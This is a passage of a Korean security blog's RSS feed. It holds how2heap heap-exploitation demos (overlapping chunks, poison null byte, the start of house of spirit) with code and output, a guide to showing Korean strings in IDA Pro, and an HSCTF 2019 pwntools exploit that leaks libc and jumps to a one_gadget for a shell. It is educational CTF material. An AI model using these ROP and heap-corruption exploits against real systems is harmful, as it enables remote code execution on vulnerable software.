포함한다.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n이제 p4 chunk안에 복사된 모든 것들은 p3 chunk에 있는 데이터를 overwrite할 수 있다,"</span></span><br><span class="line"><span class="string">"그리고 p3 chunk에 쓰여진 데이터는 p4 chunk 안에 저장되어있는 데이터를 overwrite할 수 있다.\n\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이제 예시를 돌려보자. 지금, 우리는 가지고 있다:\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p4 = %s\n"</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p3 = %s\n"</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nIf we memset(p4, '4', %d), we have:\n"</span>, evil_region_size);</span><br><span class="line"><span class="built_in">memset</span>(p4, <span class="string">'4'</span>, evil_region_size);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p4 = %s\n"</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p3 = %s\n"</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nAnd if we then memset(p3, '3', 80), we have:\n"</span>);</span><br><span class="line"><span class="built_in">memset</span>(p3, <span class="string">'3'</span>, <span class="number">80</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p4 = %s\n"</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p3 = %s\n"</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>이 기법은 glibc에서 tcache옵션이 disabled된 상태에만 작동한다.</p><p><code>simple chunks overlapping</code></p><p>heap에 chunk 3개를 할당해보자.<br>3개의 chunk가 여기에 할당됐다:<br><code>p1=0x603010</code><br><code>p2=0x603110</code><br><code>p3=0x603210</code></p><p>이제 p2 chunk를 free시켜보자<br>p2 chuck는 이제 unsorted bin안에서 그 크기의 새로운 malloc()을 제공할 준비가 되어있다<br>이제 p2를 free시킨 chunk의 크키를 overwrite할 수 있는 overflow를 시연해보자.<br>toy 프로그램의 경우, 마지막 세 개의 bit값은 중요하지 않다.<br>하지만, heap의 안정성을 유지하는 것이 베스트다.<br>이 안정성을 유지하기 위해 우리는 최하위 bit를 1(prev_inuse)로 표시할 것이다.<br>p1이 free chunk로 오인하지 않고 확실히 하기 위해 우리는 p2 chunk의 크기를 385로 설정할 것이다. 그렇게 하는 것은 우리에게 376의 region size를 준다.</p><p>이제 다른 chunk를 주입된 p2 chunk의 데이터 크기와 똑같은 크기에 할당해준다.<br>이 malloc은 우리가 크기를 바꾸었던, unsorted bin안에 있는, 전에 free되었던 chunk로부터 제공되어질 것이다.</p><p>p4는 <code>0x603110</code>에 할당되었고 <code>0x603288</code>에서 끝난다.<br>p3는 <code>0x603210</code>에서 시작해 <code>0x603288</code>에서 끝난다<br>p4는 p3와 overlap되어야한다, 이 경우에 p4는 모든 p3를 포함한다.</p><p>이제 p4 chunk안에 복사된 모든 것들은 p3 chunk에 있는 데이터를 overwrite할 수 있다<br>그리고 p3 chunk에 쓰여진 데이터는 p4 chunk 안에 저장되어있는 데이터를 overwrite할 수 있다.</p><p>이제 예시를 돌려보자. 지금, 우리는 가지고 있다:<br><code>p4 = x</code><br><code>3 = 333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333</code></p><p>If we memset(p4, ‘4’, 376), we have:<br><code>p4 = 4444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444</code><br><code>p3 = 444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444</code></p><p>And if we then memset(p3, ‘3’, 80), we have:<br><code>p4 = 4444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444333333333333333333333333333333333333333333333333333333333333333333333333333333334444444444444444444444444444444444444444</code><br><code>p3 = 333333333333333333333333333333333333333333333333333333333333333333333333333333334444444444444444444444444444444444444444</code></p>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/06/20/How2Heap-Overlapping-Chunks/#disqus_thread</comments>
    </item>
    
    <item>
      <title>IDA Pro 한글 스트링 적용 방법</title>
      <link>http://j0n9hyun.github.io/2019/06/13/ida-7.0-korean-string-apply/</link>
      <guid>http://j0n9hyun.github.io/2019/06/13/ida-7.0-korean-string-apply/</guid>
      <pubDate>Thu, 13 Jun 2019 04:37:48 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h3 id=&quot;ida-pro-korean-string-적용-방법&quot;&gt;&lt;a c
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="ida-pro-korean-string-적용-방법"><a class="markdownIt-Anchor" href="#ida-pro-korean-string-적용-방법"></a> IDA Pro Korean String 적용 방법</h3><p><a href="https://github.com/j0n9hyun/j0n9hyun.github.io/files/3284234/korean.zip" target="_blank" rel="noopener"><strong>패치 파일</strong></a></p><p>바이너리 파일에  영어가 아닌 다른 언어가 입력돼있으면 IDA에서는 <code>puts(byte_8048840)</code> 처럼 한글 그대로 나오지 않는 것을 볼 수 있다. 물론 대부분은 영어로 작성돼있고 이렇게 돼있는다 한들, 보는 데 크게 지장을 주진 않지만 그래도 한번 찾아본 결과, 방법을 알아볼 수 있었다.</p><center><p><strong><code>해당 설명은 IDA Pro 7.0 버전을 기준으로 설명한다.</code></strong></p><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/59404563-f2ab9580-8de1-11e9-82d1-00d5fa782281.PNG"><center><small> [IDA Pro] </small></center> <br>우선 위에 있는 패치 파일을 다운 받고 압축을 풀어서 IDA 설치 경로 안에 있는 cfg 폴더에 넣어준다.<p><code>기본경로:C:\Program Files\IDA 7.0\cfg</code><br><br></p><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/59404811-f986d800-8de2-11e9-871d-d51cd03012a8.PNG"><center><small> [ida.cfg] </small></center> <br>다음 ida.cfg 파일을 열어서 분홍박스처럼 한 줄 추가해주면 적용이 완료된다.(앞에 주석을 실수로 달았다. //는 빼주자)<br><br><br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/59404273-f0950700-8de0-11e9-9ff4-900da4536761.PNG"><center><small> [적용 화면] </small></center><center><p><strong><code>세 줄 요약</code><br><code>1. 패치 파일 다운 받아서 압축 품</code><br><code>2. 파일을 IDA 설치 경로에 있는 cfg 폴더 안에 넣음</code><br><code>3. ida.cfg 파일에 한 줄 추가함</code></strong></p></center><p><a href="http://m.egloos.zum.com/shadowxx/v/11310107" target="_blank" rel="noopener">Source</a></p><style>  img.border-shadow{      border:1px solid #888888;      box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);  }</style></center>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/06/13/ida-7.0-korean-string-apply/#disqus_thread</comments>
    </item>
    
    <item>
      <title>HSCTF 2019 Combo Chain</title>
      <link>http://j0n9hyun.github.io/2019/06/09/HSCTF-2019-Combo-Chain/</link>
      <guid>http://j0n9hyun.github.io/2019/06/09/HSCTF-2019-Combo-Chain/</guid>
      <pubDate>Sat, 08 Jun 2019 22:28:42 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h3 id=&quot;combo-chain&quot;&gt;&lt;a class=&quot;markdownIt
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="combo-chain"><a class="markdownIt-Anchor" href="#combo-chain"></a> Combo Chain</h3><p><a href="https://github.com/j0n9hyun/j0n9hyun.github.io/files/3268976/combo-chain.zip" target="_blank" rel="noopener"><strong>Binary File</strong></a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#r = process('./combo-chain')</span></span><br><span class="line">r = remote(<span class="string">'pwn.hsctf.com'</span>, <span class="number">2345</span>)</span><br><span class="line">e = ELF(<span class="string">'./combo-chain'</span>)</span><br><span class="line">libc = e.libc</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> a: r.recvuntil(a)</span><br><span class="line">sl = <span class="keyword">lambda</span> a: r.sendline(a)</span><br><span class="line">sa = <span class="keyword">lambda</span> a, b: r.sendafter(a, b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b: r.sendlineafter(a, b)</span><br><span class="line">ex = <span class="keyword">lambda</span> : r.interactive()</span><br><span class="line"></span><br><span class="line">gets_offset = libc.symbols[<span class="string">'gets'</span>]</span><br><span class="line">gets_got = e.got[<span class="string">'gets'</span>]</span><br><span class="line">printf_plt = e.plt[<span class="string">'printf'</span>]</span><br><span class="line">main = e.symbols[<span class="string">'main'</span>]</span><br><span class="line">pr = <span class="number">0x0000000000401263</span> <span class="comment"># pop rdi; ret</span></span><br><span class="line">nop = <span class="number">0x000000000040114f</span></span><br><span class="line">one_gadget = <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line">p = <span class="string">""</span></span><br><span class="line">p += <span class="string">"\x90"</span>*<span class="number">16</span></span><br><span class="line">p += p64(pr)</span><br><span class="line">p += p64(gets_got)</span><br><span class="line">p += p64(nop)</span><br><span class="line">p += p64(printf_plt)</span><br><span class="line">p += p64(main)</span><br><span class="line">sla(<span class="string">": "</span>, p)</span><br><span class="line"></span><br><span class="line">leaked = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line"><span class="keyword">print</span> hex(leaked)</span><br><span class="line">libc_base = leaked - gets_offset</span><br><span class="line">one_shot = libc_base + one_gadget</span><br><span class="line"></span><br><span class="line">p = <span class="string">""</span></span><br><span class="line">p += <span class="string">"\x90"</span>*<span class="number">16</span></span><br><span class="line">p += p64(one_shot)</span><br><span class="line">sla(<span class="string">": "</span>, p)</span><br><span class="line">ex()</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/06/09/HSCTF-2019-Combo-Chain/#disqus_thread</comments>
    </item>
    
    <item>
      <title>[How2Heap] Poison_null_byte</title>
      <link>http://j0n9hyun.github.io/2019/05/31/How2Heap-Poison-null-byte/</link>
      <guid>http://j0n9hyun.github.io/2019/05/31/How2Heap-Poison-null-byte/</guid>
      <pubDate>Fri, 31 May 2019 02:18:06 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h3 id=&quot;poison_null_bytec&quot;&gt;&lt;a class=&quot;mark
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="poison_null_bytec"><a class="markdownIt-Anchor" href="#poison_null_bytec"></a> Poison_null_byte.c</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"null byte 2.0!\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"테스트 환경: Ubuntu 14.04 64bit.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이 기법은 glibc에서 tcache 옵션이 disabled된 상태에만 작동한다.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이 기법은 null바이트를 이용하여 malloc된 영역으로 off-by-one할때 사용할 수 있다.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span>* a;</span><br><span class="line"><span class="keyword">uint8_t</span>* b;</span><br><span class="line"><span class="keyword">uint8_t</span>* c;</span><br><span class="line"><span class="keyword">uint8_t</span>* b1;</span><br><span class="line"><span class="keyword">uint8_t</span>* b2;</span><br><span class="line"><span class="keyword">uint8_t</span>* d;</span><br><span class="line"><span class="keyword">void</span> *barrier;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"'a'에 0x100 bytes 할당한다.\n"</span>);</span><br><span class="line">a = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"a: %p\n"</span>, a);</span><br><span class="line"><span class="keyword">int</span> real_a_size = malloc_usable_size(a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"우리는 'a'에 overflow가 발생하는 것을 원하기 때문에, 'a'의 '진짜' 크기를 알 필요가 있다. "</span></span><br><span class="line"><span class="string">"(반올림 때문에 0x100 이상이 될 수 있음): %#x\n"</span>, real_a_size);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* chunk size attribute cannot have a least significant byte with a value of 0x00.</span></span><br><span class="line"><span class="comment">* the least significant byte of this will be 0x10, because the size of the chunk includes</span></span><br><span class="line"><span class="comment">* the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">b = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"b: %p\n"</span>, b);</span><br><span class="line"></span><br><span class="line">c = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"c: %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line">barrier =  <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"barrier를 %p에 할당하면, c는 free될 때 top-chunk로 consolidate되지 않는다.\n"</span></span><br><span class="line"><span class="string">"barrier가 엄격하게 필요한 건 아니지만 상황을 덜 혼란스럽게 만든다.\n"</span>, barrier);</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span>* b_size_ptr = (<span class="keyword">uint64_t</span>*)(b - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// added fix for size==prev_size(next_chunk) check in newer versions of glibc</span></span><br><span class="line"><span class="comment">// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30</span></span><br><span class="line"><span class="comment">// this added check requires we are allowed to have null pointers in b (not just a c string)</span></span><br><span class="line"><span class="comment">//*(size_t*)(b+0x1f0) = 0x200;</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"glibc의 새 버전에서 'chunksize(P) != prev_size (next_chunk(P))' 검사를 통과하려면 b안에 변경된(updated) 크기를 가지고 있어야 한다.\n"</span>);</span><br><span class="line"><span class="comment">// we set this location to 0x200 since 0x200 == (0x211 &amp; 0xff00)</span></span><br><span class="line"><span class="comment">// which is the value of b.size after its first byte has been overwritten with a NULL byte</span></span><br><span class="line">*(<span class="keyword">size_t</span>*)(b+<span class="number">0x1f0</span>) = <span class="number">0x200</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// this technique works by overwriting the size metadata of a free chunk</span></span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"b.size: %#lx\n"</span>, *b_size_ptr);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"b.size: (0x200 + 0x10) | prev_in_use\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"우리는 'b'의 metadata에 있는 single null byte를 이용해서 'a'를 overflow한다.\n"</span>);</span><br><span class="line">a[real_a_size] = <span class="number">0</span>; <span class="comment">// exploit된 bug "</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"b.size: %#lx\n"</span>, *b_size_ptr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span>* c_prev_size_ptr = ((<span class="keyword">uint64_t</span>*)c)<span class="number">-2</span>;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"c.prev_size: %#lx\n"</span>,*c_prev_size_ptr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 이 malloc은 b였던 chunk에서 unlink를 호출하는 결과일 것이다.</span></span><br><span class="line"><span class="comment">// The added check (commit id: 17f487b), if not properly handled as we did before,</span></span><br><span class="line"><span class="comment">// will detect the heap corruption now.</span></span><br><span class="line"><span class="comment">// The check is this: chunksize(P) != prev_size (next_chunk(P)) where</span></span><br><span class="line"><span class="comment">// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)</span></span><br><span class="line"><span class="comment">// next_chunk(P) == b-0x10+0x200 == b+0x1f0</span></span><br><span class="line"><span class="comment">// prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"우리는 chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P)) 이후로 검사를 통과할 것이다.\n"</span>,</span><br><span class="line">*((<span class="keyword">size_t</span>*)(b<span class="number">-0x8</span>)), *(<span class="keyword">size_t</span>*)(b<span class="number">-0x10</span> + *((<span class="keyword">size_t</span>*)(b<span class="number">-0x8</span>))));</span><br><span class="line">b1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"b1: %p\n"</span>,b1);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이제 우리는 'b1'을 malloc한다. 그것은 'b'에 있던 곳에 위치할 것이다. "</span></span><br><span class="line"><span class="string">"이 시점에서 c.prev_size가 변경됐어야 했지만, 그렇지 않았다: %#lx\n"</span>,*c_prev_size_ptr);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"흥미롭게도, c.prev_size의 변경된 값은 c.prev_size 앞에 0x10 bytes로 write됐다: %lx\n"</span>,*(((<span class="keyword">uint64_t</span>*)c)<span class="number">-4</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"'victim' chunk에 'b2'를 malloc한다.\n"</span>);</span><br><span class="line"><span class="comment">// 보통 b2(victim)는 우리가 조작할 수 있는 취약한 포인터를 가진 구조일 것이다.</span></span><br><span class="line"></span><br><span class="line">b2 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"b2: %p\n"</span>,b2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(b2,<span class="string">'B'</span>,<span class="number">0x80</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"현재 b2 content:\n%s\n"</span>,b2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이제 우리는 'b1'과 c를 free한다: 'b1'과 'c'청크는 consolidate될 것이다.(b2를 잊어버리고)\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(b1);</span><br><span class="line"><span class="built_in">free</span>(c);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"마지막으로, 'd'를 할당해서 'b2'를 overlapping한다.\n"</span>);</span><br><span class="line">d = <span class="built_in">malloc</span>(<span class="number">0x300</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"d: %p\n"</span>,d);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"'d'와 'b2'가 overlap되었다.\n"</span>);</span><br><span class="line"><span class="built_in">memset</span>(d,<span class="string">'D'</span>,<span class="number">0x300</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"바뀐 b2 content:\n%s\n"</span>,b2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>null byte 2.0!</code><br><code>테스트 환경: Ubuntu 14.04 64bit.</code><br>이 기법은 glibc에서 tcache 옵션이 disabled된 상태에만 작동한다.<br>이 기법은 null바이트를 이용하여 malloc된 영역으로 off-by-one할때 사용할 수 있다.<br>'a’에 0x100 bytes 할당한다.<br><code>a: 0x603010</code><br>우리는 'a’에 overflow가 발생하는 것을 원하기 때문에, 'a’의 ‘진짜’ 크기를 알 필요가 있다. (반올림 때문에 0x100 이상이 될 수 있음): <code>0x108</code><br><code>b: 0x603120</code><br><code>c: 0x603330</code><br>barrier를 0x603440에 할당하면, c는 free될 때 top-chunk로 consolidate되지 않는다.<br>barrier가 엄격하게 필요한 건 아니지만 상황을 덜 혼란스럽게 만든다.<br>glibc의 새 버전에서 ‘chunksize§ != prev_size (next_chunk§)’ 검사를 통과하려면 b안에 변경된(updated) 크기를 가지고 있어야 한다.<br><code>b.size: 0x211</code><br><code>b.size: (0x200 + 0x10) | prev_in_use</code><br>우리는 'b’의 metadata에 있는 single null byte를 이용해서 'a’를 overflow한다.<br><code>b.size: 0x200</code><br><code>c.prev_size: 0x210</code><br>우리는 chunksize§ == 0x200 == 0x200 == prev_size (next_chunk§) 이후로 검사를 통과할 것이다.<br><code>b1: 0x603120</code><br>이제 우리는 'b1’을 malloc한다. 그것은 'b’에 있던 곳에 위치할 것이다. 이 시점에서 c.prev_size가 변경됐어야 했지만, 그렇지 않았다: <code>0x210</code><br>흥미롭게도, c.prev_size의 변경된 값은 c.prev_size 앞에 0x10 bytes로 write됐다: f0<br>‘victim’ chunk에 'b2’를 malloc한다.<br><code>b2: 0x603230</code><br>현재 b2 content:<br><code>BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB</code><br>이제 우리는 'b1’과 c를 free한다: 'b1’과 'c’청크는 consolidate될 것이다.(b2를 잊어버리고)<br>마지막으로, 'd’를 할당해서 'b2’를 overlapping한다.<br><code>d: 0x603120</code><br>'d’와 'b2’가 overlap되었다.<br><code>바뀐 b2 contentcode></p>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/05/31/How2Heap-Poison-null-byte/#disqus_thread</comments>
    </item>
    
    <item>
      <title>[How2Heap] House_of_spirit</title>
      <link>http://j0n9hyun.github.io/2019/05/29/How2Heap-House-of-spirit-c/</link>
      <guid>http://j0n9hyun.github.io/2019/05/29/How2Heap-House-of-spirit-c/</guid>
      <pubDate>Wed, 29 May 2019 07:05:24 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h3 id=&quot;house_of_spiritc&quot;&gt;&lt;a class=&quot;markd
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="house_of_spiritc"><a class="markdownIt-Anchor" href="#house_of_spiritc"></a> House_of_spirit.c</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span 